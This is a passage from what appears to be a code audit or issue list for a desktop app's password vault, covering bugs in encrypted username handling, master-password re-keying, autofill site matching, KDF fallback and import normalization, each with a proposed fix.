- **Fix:** Add one reusable in-page input modal to credentials.html, e.g. #modal-input with a label, an <input> (type=password when needed), OK and Cancel, and a promise-returning `askInput({title, label, type, defaultValue})` helper in credentials-renderer.js (same pattern as notes-renderer.js:70 or log-viewer-renderer.js:1216). Replace the six prompt() calls with `await askInput(...)` and keep the existing null/empty checks.

#### A-021 🟠 Search and list subtitles no longer work for usernames after migration _(WIP)_
- **Where:** `db.js:2194` · **Category:** correctness · **Status:** open
- **Impact:** Searching the vault for 'alice@example.com' returns nothing. Several accounts on one site all show the same subtitle.
- **Fix:** At credentials-ipc.js:911, use `const login = _plainLogin(row);`. In credentials-list (line 348) and the match handlers (763-769, 821-827), map each row to `login: _plainLogin(ctx.db.getCredential(r.id))`, or add a db helper that also selects login_encrypted and decrypt that. All of these handlers already require the vault to be unlocked. For search, filter the decrypted logins and notes in memory after the SQL query, or add an HMAC blind index column.

#### A-029 🟠 credentials-change-master re-keys only some columns, is non-atomic, destroys undecryptable data and ignores the re-unlock result _(WIP)_
- **Where:** `main-process/ipc/handlers/credentials-ipc.js:1252` · **Category:** data-loss · **Status:** open
- **Impact:** A user changes the master password. On the next credentials-get, every username and note returns '' (_plainLogin/_plainNotes decrypt fails) and encrypted traffic logs show _locked. Any legacy CV01 password is overwritten with an encrypted empty string.
- **Fix:** Extend getAllCredentialCipherRows to also return login_encrypted and notes_encrypted, including trashed rows. Wrap the whole operation in db.getDb().transaction(). Inside it, re-encrypt password, extra, login, notes, custom fields, CN02 user_notes (profile-scoped) and request_logs *_enc columns with newKey. On any decrypt failure, throw and roll back instead of writing ''/{}. Update verify_blob inside the same transaction. Afterwards, check the unlockVault result and return an error if it fails, or add a vaultSession.setKey(vid, newKey) that bypasses the rate limiter. Route the old-password check through the rate limiter.

#### A-030 🟠 Autofill and toolbar site matches use the plaintext login column, which is empty after migration _(WIP)_
- **Where:** `main-process/ipc/handlers/credentials-ipc.js:911` · **Category:** correctness · **Status:** open
- **Impact:** After the first unlock, every autofill puts an empty string into the username field. The toolbar popup lists entries with blank usernames, so the user cannot tell accounts on the same site apart.
- **Fix:** In fill-active-tab, replace line 911 with `const login = _plainLogin(row);`. In site-matches and unlock-and-get-matches, map each row with `const full = ctx.db.getCredential(r.id); login: full ? _plainLogin(full) : ''` (the vault is unlocked on both paths). In _saveCapturedCredential, match with `_plainLogin(ctx.db.getCredential(r.id) || r)`. Also write login:'' plus login_encrypted there instead of the plaintext login.

#### A-031 🟠 credentials-save always wipes url_match, so items saved from the Credentials window never match any site _(WIP)_
- **Where:** `main-process/ipc/handlers/credentials-ipc.js:443` · **Category:** correctness · **Status:** open
- **Impact:** A user edits a captured credential (url_match 'https://site.com/*') and changes only the password. After saving, the toolbar shows no match for site.com and autofill says 'No saved credentials for this site'. Items created manually in the Credentials window never match any site.
- **Fix:** In credentials-save, when p.id is set and p.url_match === undefined, keep the existing value (`url_match = ctx.db.getCredential(p.id)?.url_match || ''`). For new items with no url_match, derive one from the first entry in p.uris (the URL's origin + '/*'), or from `https://${domain}/*` when domain !== '(no site)'. For a full fix, have the match helpers also accept credential_uris.
- _Reported 2× (also: same area)_

#### A-072 🟡 Silent Argon2 -> scrypt fallback with no KDF marker in the blob can lock users out _(WIP)_
- **Where:** `credentials-crypto.js:28` · **Category:** compat · **Status:** open
- **Impact:** A vault is created on a machine where argon2 failed to load. A later update fixes argon2 loading, and the correct password is rejected forever, together with the vault and profile.
- **Fix:** Record the KDF in the blob, for example a KDF byte after the version (0x01 = argon2id, 0x02 = scrypt), or a separate version value for scrypt-CV02. Pass that id to deriveMasterKey in verifyVaultPassword and deriveSessionKeyFromVerifyBlob. For blobs already written without the byte, try argon2id first and fall back to scrypt. In createVaultVerifyBlob, throw (or at least console.error / sysLog) when _argon2 is null rather than silently writing a scrypt CV02 blob. Remove createVaultVerifyBlobSync, or give it the scrypt KDF id.
- _Reported 2× (also: build-ci-tests)_

#### A-073 🟡 Imported items don't match sites: domain is the full hostname and url_match is an exact URL or comma list
- **Where:** `credentials-renderer.js:196` · **Category:** correctness · **Status:** open
- **Impact:** The user imports Chrome passwords. On accounts.google.com the toolbar shows 0 matches and autofill says 'No saved credentials for this site'.
- **Fix:** In _insertCredentialFromImport, normalize the domain with getNoteDomainFromUrl(p.domain || first URI) and fall back to the raw value only for non-URL input. Normalize url_match as well: split on /,\s*/, take the first valid http(s) URL, and store `${new URL(u).origin}/*`. Save any remaining URIs to credential_uris. Alternatively, have the renderer send a list of URIs and let main normalize them.

#### A-077 🟡 Users cannot clear username or notes: saveCredential UPDATE uses COALESCE on the encrypted columns
- **Where:** `db.js:2275` · **Category:** data-loss · **Status:** open
- **Impact:** A user clears the Notes field (which contains a secret) and saves. On reload the old notes appear again. Same for the username.
